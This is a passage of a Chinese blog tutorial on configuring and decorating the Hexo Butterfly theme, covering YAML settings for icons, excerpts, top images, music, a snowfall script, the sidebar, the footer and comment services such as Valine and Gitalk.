class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CDN_USE:</span><br><span class="line">  css:</span><br><span class="line">    - https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;font-awesome@latest&#x2F;css&#x2F;font-awesome.min.css</span><br><span class="line">    - https:&#x2F;&#x2F;use.fontawesome.com&#x2F;releases&#x2F;v5.8.1&#x2F;css&#x2F;all.css</span><br></pre></td></tr></table></figure><p>无论V4还是V5，书写格式都是一样的<code>图标名：url</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">social:</span><br><span class="line">  fa fa-github: https:&#x2F;&#x2F;github.com&#x2F;xxx</span><br><span class="line">  fa fa-rsss: &#x2F;atom.xml</span><br></pre></td></tr></table></figure><p>图标可以在这寻找</p><img src="hexo-buttfly-美化/hexo-theme-butterfly-doc-fontawesome.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>因为主题UI的关系，<code>主页文章节选</code>只支持<code>自动节选</code>和<code>文章页description</code>。优先选择<code>自动节选</code></p><p>在<code>butterfly.yml</code>里可以开启<code>auto_excerpt</code>的选项，你的文章将会在自动截取部分显示在主页(默认显示150个字)</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_excerpt:</span><br><span class="line">  enable: true</span><br><span class="line">  length: 150</span><br></pre></td></tr></table></figure><p>如果没有开启<code>自动节选</code>，则会显示文章页front-matter里面设置的<code>description</code></p><p>注意:如果开启了自动节选功能，代码块的显示将有可能不正常。</p><h2 id="顶部图"><a href="#顶部图" class="headerlink" title="顶部图"></a>顶部图</h2><p><code>顶部图</code>有两种配置:具体url和(留空·true和false，三个效果一样)</p><h3 id="page页"><a href="#page页" class="headerlink" title="page页"></a>page页</h3><h4 id="当具体url时"><a href="#当具体url时" class="headerlink" title="当具体url时"></a>当具体url时</h4><p>主页的顶部图可以在<code>Butterfly.yml</code>设置<code>index_img</code></p><p>archives页的顶部图可以在<code>Butterfly.yml</code>设置<code>archive_img</code></p><p>其他<code>page</code>页的顶部图可以在各自的md页面设置<code>front-matter</code>中的<code>top_img</code></p><p>页面如果没有设置各自的<code>top_img</code>则会显示<code>default_top_img</code>图片</p><h4 id="当顶部图留空·true和false"><a href="#当顶部图留空·true和false" class="headerlink" title="当顶部图留空·true和false"></a>当顶部图留空·true和false</h4><p>主页会显示纯颜色的顶部图</p><p>其他page的顶部图没有设置时，也会显示纯颜色的顶部图</p><h3 id="post页"><a href="#post页" class="headerlink" title="post页"></a>post页</h3><p><code>post</code>页的顶部图会优先显示各自<code>front-matter</code>中的<code>top_img</code>，如果没有设置，则会缩略图(即各自<code>front-matter</code>中的<code>cover</code>)，如果没有则会显示<code>default_top_img</code>图片</p><h1 id="音乐（左下角）"><a href="#音乐（左下角）" class="headerlink" title="音乐（左下角）"></a>音乐（左下角）</h1><p>博客配置文件_config.yml</p><img src="hexo-buttfly-美化/2020-11-07 133801.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>主题_config.yml</p><img src="hexo-buttfly-美化/2020-11-07 133421.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><p>&lt;div class=”aplayer no-destroy” data-id=”2829883282” data-server=”netease” data-type=”playlist” data-fixed=”true” data-mini=”true” data-listFolded=”false” data-order=”random” data-preload=”none” data-autoplay=”false” muted&gt;&lt;/div&gt;</p><p>data-id    require    song id / playlist id / album id / search keyword #歌单ID<br>data-server    require    music platform: netease, tencent, kugou, xiami, baidu#歌单服务器<br>data-type    require    song, playlist, album, search, artist#歌单类型</p><p>data-autoplay    false    audio autoplay    #自动播放<br>data-theme    #2980b9    main color        #主题颜色<br>data-loop    all    player loop play, values: ‘all’, ‘one’, ‘none’<br>data-order    list    player play order, values: ‘list’, ‘random’</p><p>例如：</p><p><a href="https://music.163.com/#/my/m/music/playlist?id=2829883282">https://music.163.com/#/my/m/music/playlist?id=2829883282</a></p><p>data-id=2829883282 data-server=netease data-type=playlist</p><h1 id="雪花"><a href="#雪花" class="headerlink" title="雪花"></a>雪花</h1><p>首先进入自己博客目录找到以下js文件</p><p>MyBlog\themes\butterfly\source\js\snow.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*样式一*/</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">$</span>)</span>&#123;</span><br><span class="line">    $.fn.snow = <span class="function"><span class="keyword">function</span>(<span class="params">options</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $flake = $(<span class="string">&#x27;&lt;div id=&quot;snowbox&quot; /&gt;&#x27;</span>).css(&#123;<span class="string">&#x27;position&#x27;</span>: <span class="string">&#x27;absolute&#x27;</span>,<span class="string">&#x27;z-index&#x27;</span>:<span class="string">&#x27;9999&#x27;</span>, <span class="string">&#x27;top&#x27;</span>: <span class="string">&#x27;-50px&#x27;</span>&#125;).html(<span class="string">&#x27;&amp;#10052;&#x27;</span>),</span><br><span class="line">    documentHeight     = $(<span class="built_in">document</span>).height(),</span><br><span class="line">    documentWidth    = $(<span class="built_in">document</span>).width(),</span><br><span class="line">    defaults = &#123;</span><br><span class="line">        minSize        : <span class="number">10</span>,</span><br><span class="line">        maxSize        : <span class="number">20</span>,</span><br><span class="line">        newOn        : <span class="number">1000</span>,</span><br><span class="line">        flakeColor    : <span class="string">&quot;#AFDAEF&quot;</span> <span class="comment">/* 此处可以定义雪花颜色，若要白色可以改为#FFFFFF */</span></span><br><span class="line">    &#125;,</span><br><span class="line">    options    = $.extend(&#123;&#125;, defaults, options);</span><br><span class="line">    <span class="keyword">var</span> interval= <span class="built_in">setInterval</span>( <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> startPositionLeft = <span class="built_in">Math</span>.random() * documentWidth - <span class="number">100</span>,</span><br><span class="line">    startOpacity = <span class="number">0.5</span> + <span class="built_in">Math</span>.random(),</span><br><span class="line">    sizeFlake = options.minSize + <span class="built_in">Math</span>.random() * options.maxSize,</span><br><span class="line">    endPositionTop = documentHeight - <span class="number">200</span>,</span><br><span class="line">    endPositionLeft = startPositionLeft - <span class="number">500</span> + <span class="built_in">Math</span>.random() * <span class="number">500</span>,</span><br><span class="line">    durationFall = documentHeight * <span class="number">10</span> + <span class="built_in">Math</span>.random() * <span class="number">5000</span>;</span><br><span class="line">    $flake.clone().appendTo(<span class="string">&#x27;body&#x27;</span>).css(&#123;</span><br><span class="line">        left: startPositionLeft,</span><br><span class="line">        opacity: startOpacity,</span><br><span class="line">        <span class="string">&#x27;font-size&#x27;</span>: sizeFlake,</span><br><span class="line">        color: options.flakeColor</span><br><span class="line">    &#125;).animate(&#123;</span><br><span class="line">        top: endPositionTop,</span><br><span class="line">        left: endPositionLeft,</span><br><span class="line">        opacity: <span class="number">0.2</span></span><br><span class="line">    &#125;,durationFall,<span class="string">&#x27;linear&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="built_in">this</span>).remove()</span><br><span class="line">    &#125;);</span><br><span class="line">    &#125;, options.newOn);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)(jQuery);</span><br><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.fn.snow(&#123; </span><br><span class="line">        minSize: <span class="number">5</span>, <span class="comment">/* 定义雪花最小尺寸 */</span></span><br><span class="line">        maxSize: <span class="number">50</span>,<span class="comment">/* 定义雪花最大尺寸 */</span></span><br><span class="line">        newOn: <span class="number">300</span>  <span class="comment">/* 定义密集程度，数字越小越密集 */</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h1><p>这个选项是用来显示文章相关的相关信息的</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post_meta:</span><br><span class="line">  date_type: both #or created or updated 文章日期是创建日或者更新日或者都显示</span><br><span class="line">  categories: true # or false 是否显示分类</span><br><span class="line">  tags: true # or false 是否显示标签</span><br></pre></td></tr></table></figure><p>在文章顶部的资料</p><p><code>date_type:</code>可设置文章日期显示创建日期(<code>created</code>)或者更新日期(<code>updated</code>)或者两种都显示(<code>both</code>)</p><p><code>categories</code>是否显示分类</p><p><code>tags</code>是否显示标签</p><h2 id="文章版权"><a href="#文章版权" class="headerlink" title="文章版权"></a>文章版权</h2><p>为你的博客文章展示文章版权和许可协议。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  enable: true</span><br><span class="line">  license: CC BY-NC-SA 4.0</span><br><span class="line">  license_url: https:&#x2F;&#x2F;creativecommons.org&#x2F;licenses&#x2F;by-nc-sa&#x2F;4.0&#x2F;</span><br></pre></td></tr></table></figure><p>如果有文章(例如：转载文章)不需要显示版权，可以在文章Front-matter单独设置</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copyright: false</span><br></pre></td></tr></table></figure><h2 id="文章打赏"><a href="#文章打赏" class="headerlink" title="文章打赏"></a>文章打赏</h2><p>在你每篇文章的结尾，可以添加打赏按钮，相关二维码可以自行配置</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reward:</span><br><span class="line">  enable: true</span><br><span class="line">  QR_code:</span><br><span class="line">    - itemlist:</span><br><span class="line">        img: &#x2F;img&#x2F;wechat.jpg</span><br><span class="line">        text: 微信</span><br><span class="line">    - itemlist: </span><br><span class="line">        img: &#x2F;img&#x2F;alipay.jpg</span><br><span class="line">        text: 支付宝</span><br></pre></td></tr></table></figure><h2 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h2><p>文章的markdown文档上，在<code>Front-matter</code>添加<code>cover</code>，并填上要显示的图片地址<br>如果不配置<code>cover</code>，可以设置显示默认的cover</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default_cover: https:&#x2F;&#x2F;xxx.com&#x2F;xxx.png</span><br></pre></td></tr></table></figure><p>当配置多张图片时，会随机选择一张作为cover，此时写法应为</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">default_cover:</span><br><span class="line">  - https:&#x2F;&#x2F;xxx.com&#x2F;xxx.png</span><br><span class="line">  - https:&#x2F;&#x2F;xxx.com&#x2F;yyy.png</span><br><span class="line">  - https:&#x2F;&#x2F;xxx.com&#x2F;zzz.png</span><br></pre></td></tr></table></figure><h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">avatar: https:&#x2F;&#x2F;xxx&#x2F;avatar.png</span><br></pre></td></tr></table></figure><h2 id="toc"><a href="#toc" class="headerlink" title="toc"></a>toc</h2><p>在文章页，会有一个目录，用于显示TOC。手机端默认显示按钮。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">toc:</span><br><span class="line">  enable: true</span><br><span class="line">  number: true  #显示章节数字</span><br></pre></td></tr></table></figure><h3 id="为特定的文章配置是否显示TOC和特定的目录章节数字"><a href="#为特定的文章配置是否显示TOC和特定的目录章节数字" class="headerlink" title="为特定的文章配置是否显示TOC和特定的目录章节数字"></a>为特定的文章配置是否显示TOC和特定的目录章节数字</h3><p>在你的文章<code>md</code>文件的头部，加入<code>toc_number</code>和<code>toc</code>项，并配置<code>true</code>或者<code>false</code>即可。</p><p><code>toc</code>是否显示文章TOC</p><p><code>toc_number</code>是否显示章节数</p><p>配置之后你的特定的文章将会拥有它自己的目录数字的显示与否，而不会受全局的配置影响。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable: true</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number: false</span><br></pre></td></tr></table></figure><h3 id="设置是否自动打开TOC"><a href="#设置是否自动打开TOC" class="headerlink" title="设置是否自动打开TOC"></a>设置是否自动打开TOC</h3><p>可选择进入文章页面时，是否自动打开sidebar显示TOC</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_open_sidebar:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><h1 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h1><p>相关文章推荐的原理是根据文章的tags的比重来推荐</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">related_post:</span><br><span class="line">  enable: true</span><br><span class="line">  limit: 6 #显示推荐文章数目</span><br></pre></td></tr></table></figure><h1 id="Footer设置"><a href="#Footer设置" class="headerlink" title="Footer设置"></a>Footer设置</h1><h2 id="博客年份"><a href="#博客年份" class="headerlink" title="博客年份"></a>博客年份</h2><p><code>since</code>是一个来展示你站点起始时间的选项，它位于页面的最底部。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">since: 2018</span><br></pre></td></tr></table></figure><h2 id="脚本页自定义文本"><a href="#脚本页自定义文本" class="headerlink" title="脚本页自定义文本"></a>脚本页自定义文本</h2><p><code>Footer_custom_text</code>是一个给你用来在页脚自定义文本的选项，通常你可以在这里写声明文本等。支持HTML。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">footer:</span><br><span class="line">  owner:</span><br><span class="line">    enable: true</span><br><span class="line">    since: 2020</span><br><span class="line">  custom_text: 欢迎来到胡先森的博客</span><br></pre></td></tr></table></figure><img src="hexo-buttfly-美化/2020-11-07 131623.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/><h2 id="ICP"><a href="#ICP" class="headerlink" title="ICP"></a>ICP</h2><p>对于部分有备案的域名，可以在ICP配置显示</p><p>配置<code>butterfly</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ICP:</span><br><span class="line">  enable: true</span><br><span class="line">  url: https:&#x2F;&#x2F;www.beian.miit.gov.cn&#x2F;state&#x2F;outPortal&#x2F;loginPortal.action</span><br><span class="line">  text: 渝ICP备888</span><br><span class="line">  icon: &#x2F;img&#x2F;icp.png</span><br></pre></td></tr></table></figure><h1 id="右下角按钮"><a href="#右下角按钮" class="headerlink" title="右下角按钮"></a>右下角按钮</h1><h2 id="简繁转换"><a href="#简繁转换" class="headerlink" title="简繁转换"></a>简繁转换</h2><p>简体繁体互换</p><p>右下角会有简繁转换按钮。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">translate:</span><br><span class="line">  enable: true</span><br><span class="line">  # 默认按钮显示文字(网站是简体，应设置为&#39;default: 繁&#39;)</span><br><span class="line">  default: 简</span><br><span class="line">  #网站默认语言，1: 繁体中文, 2: 简体中文</span><br><span class="line">  defaultEncoding: 1</span><br><span class="line">  #延迟时间,若不在前, 要设定延迟翻译时间, 如100表示100ms,默认为0</span><br><span class="line">  translateDelay: 0</span><br><span class="line">  #博客网址</span><br><span class="line">  cookieDomain: &quot;https:&#x2F;&#x2F;jerryc.me&#x2F;&quot;</span><br><span class="line">  #当文字是简体时，按钮显示的文字</span><br><span class="line">  msgToTraditionalChinese: &quot;繁&quot;</span><br><span class="line">  #当文字是繁体时，按钮显示的文字</span><br><span class="line">  msgToSimplifiedChinese: &quot;简&quot;</span><br></pre></td></tr></table></figure><h2 id="夜间模式"><a href="#夜间模式" class="headerlink" title="夜间模式"></a>夜间模式</h2><p>右下角会有夜间模式按钮</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#夜间模式</span><br><span class="line">darkmode:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><p>V2.0.0开始增加一个选项，可开启自动切换light mode和dark mode</p><p>autoChangeMode: 1 跟随系统二变化，不支持浏览器/系统将按照时间晚上6点到早上6点之间切换为dark mode</p><p>autoChangeMode: 2 只按照时间晚上6点到早上6点之间切换为dark mode，其余时间为light mode</p><p>autoChangeMode: false 取消自动切换</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 自动切换dark mode和light mode</span><br><span class="line">autoChangeMode: false</span><br></pre></td></tr></table></figure><h2 id="阅读模式"><a href="#阅读模式" class="headerlink" title="阅读模式"></a>阅读模式</h2><p>阅读模式下会去掉除文章外的内容，避免干扰阅读。</p><p>只会出现在文章页面，右下角会有阅读模式按钮</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readmode:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><h1 id="侧边栏设置"><a href="#侧边栏设置" class="headerlink" title="侧边栏设置"></a>侧边栏设置</h1><h2 id="侧边排版"><a href="#侧边排版" class="headerlink" title="侧边排版"></a>侧边排版</h2><p>可自行决定哪个项目需要显示，可决定位置。</p><p>至少需要显示一个</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aside:</span><br><span class="line">  position: right # left or right</span><br><span class="line">  card_author: true</span><br><span class="line">  card_announcement: true</span><br><span class="line">  card_recent_post: true</span><br><span class="line">  card_categories: true</span><br><span class="line">  card_tags: true</span><br><span class="line">  card_archives: true</span><br><span class="line">  card_webinfo: true</span><br></pre></td></tr></table></figure><p><strong>left默认为right</strong></p><h1 id="访问人数busuanzi-UV和PV"><a href="#访问人数busuanzi-UV和PV" class="headerlink" title="访问人数busuanzi(UV和PV)"></a>访问人数busuanzi(UV和PV)</h1><p>访问busuanzi的<a href="http://busuanzi.ibruce.info/">官方网站</a>查看更多介绍。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">busuanzi:</span><br><span class="line">  site_uv: true</span><br><span class="line">  site_pv: true</span><br><span class="line">  page_pv: true</span><br></pre></td></tr></table></figure><h2 id="运行时间"><a href="#运行时间" class="headerlink" title="运行时间"></a>运行时间</h2><p>网页已运行时间</p><p>配置<code>butterfly.yml</code></p><p>code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">runtimeshow:</span><br><span class="line">  enable: true</span><br><span class="line">  start_date: 12&#x2F;1&#x2F;2019 00:00:00</span><br><span class="line">  ##网页开通时间</span><br><span class="line">  #格式: 月&#x2F;日&#x2F;年 时间</span><br><span class="line">  #也可写成 年&#x2F;月&#x2F;日 时间</span><br></pre></td></tr></table></figure><h1 id="Note-Bootstrap-Callout"><a href="#Note-Bootstrap-Callout" class="headerlink" title="Note(Bootstrap Callout)"></a>Note(Bootstrap Callout)</h1><p>移植于next主题(注意，书写不是markdown规范，而是hexo特有的工呢，故在其它地方不会显示出效果)</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: simple</span><br><span class="line">  icons: false</span><br><span class="line">  border_radius: 3</span><br><span class="line">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span><br><span class="line">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span><br><span class="line">  light_bg_offset: 0</span><br></pre></td></tr></table></figure><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>markdown</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note [class] [no-icon] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">[class]   : default | primary | success | info | warning | danger.</span><br><span class="line">[no-icon] : Disable icon in note.</span><br><span class="line"></span><br><span class="line">All parameters are optional.</span><br></pre></td></tr></table></figure><p>具体效果、用法可查看<a href="https://theme-next.org/docs/tag-plugins/note">这里</a></p><h1 id="Gallery相册"><a href="#Gallery相册" class="headerlink" title="Gallery相册"></a>Gallery相册</h1><p>2.0.0以上提供</p><p>区别于旧版的Gallery相册，新的Gallery相册会自动根据图片长度进行排版，书写也更方便，与markdown格式一样。可根据需要插入到对应的md。</p><p>写法：</p><p>markdown</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown 图片格式</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><h1 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h1><p>只能选择一个评论服务商，我才用的是Valine，下图的注释要去掉，就是因为这个害我折腾半天</p><p><img src="C:\Users\hugan\AppData\Roaming\Typora\typora-user-images\image-20200809111529359.png" alt="image-20200809111529359"></p><h2 id="Disqus"><a href="#Disqus" class="headerlink" title="Disqus"></a>Disqus</h2><p>注册<a href="https://disqus.com/">disqus</a>配置你的disqus，然后在<code>Butterfly</code>里开启它。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">disqus:</span><br><span class="line">  enable: true # or fasle</span><br><span class="line">  shortname: 你的disqus的 short-name</span><br></pre></td></tr></table></figure><h2 id="Laibili-来必力"><a href="#Laibili-来必力" class="headerlink" title="Laibili(来必力)"></a>Laibili(来必力)</h2><p>注册<a href="http://www.laibili.com.cn/">来必力</a>配置你自己的来必力设置，然后在<code>butterfly</code>里开启它。</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">laibili:</span><br><span class="line">  enable: true # or false</span><br><span class="line">  uid: 你的laibili的uid</span><br></pre></td></tr></table></figure><p>laibili的uid你能在这里找到:<br><img src="C:\Users\hugan\AppData\Roaming\Typora\typora-user-images\image-20200809111255628.png" alt="image-20200809111255628"></p><h2 id="Gitalk"><a href="#Gitalk" class="headerlink" title="Gitalk"></a>Gitalk</h2><p>遵循<a href="https://github.com/gitalk/gitalk">gitalk</a>的指示去获取你的github Oauth应用的client id和secret值。以及查看他的相关配置说明。</p><p>然后配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gitalk:</span><br><span class="line">  enable: true</span><br><span class="line">  client_id: 你的client id</span><br><span class="line">  client_secret: 你的client secret</span><br><span class="line">  repo: 你的github仓库</span><br><span class="line">  owner: 你的github用户名</span><br><span class="line">  admin: 该仓库的拥有者或协作者</span><br></pre></td></tr></table></figure><h2 id="Valine"><a href="#Valine" class="headerlink" title="Valine"></a>Valine</h2><p>遵循<a href="https://github.com/xCss/Valine">Valine</a>的指示去配置你的LeanCloud应用。以及查看相应的配置说明。</p><p>然后配置<code>butterfly.yml</code>，记住，在之前说的yaml配置文件中的comments：下的厂商注释要确认去掉</p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">valine:</span><br><span class="line">  enable: false # if you want use valine,please set this value is true</span><br><span class="line">  appId:   # leancloud application app id</span><br><span class="line">  appKey:   # leancloud application app key</span><br><span class="line">  notify: false # valine mail notify (true&#x2F;false) https:&#x2F;&#x2F;github.com&#x2F;xCss&#x2F;Valine&#x2F;wiki</span><br><span class="line">  verify: false # valine verify code (true&#x2F;false)</span><br><span class="line">  pageSize: 10 # comment list page size</span><br><span class="line">  avatar: monsterid # gravatar style https:&#x2F;&#x2F;valine.js.org&#x2F;#&#x2F;avatar</span><br><span class="line">  lang: en # i18n: zh-cn&#x2F;en&#x2F;tw</span><br><span class="line">  placeholder: Please leave your footprints # valine comment input placeholder(like: Please leave your footprints )</span><br><span class="line">  guest_info: nick,mail,link #valine comment header inf</span><br></pre></td></tr></table></figure><h1 id="分享"><a href="#分享" class="headerlink" title="分享"></a>分享</h1><p>只能选择一个分享服务商</p><h2 id="AddThis"><a href="#AddThis" class="headerlink" title="AddThis"></a>AddThis</h2><p>找到你的pub-id</p><p>配置<code>butterfly.yml</code></p><p>yaml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addThis:</span><br><span class="line">  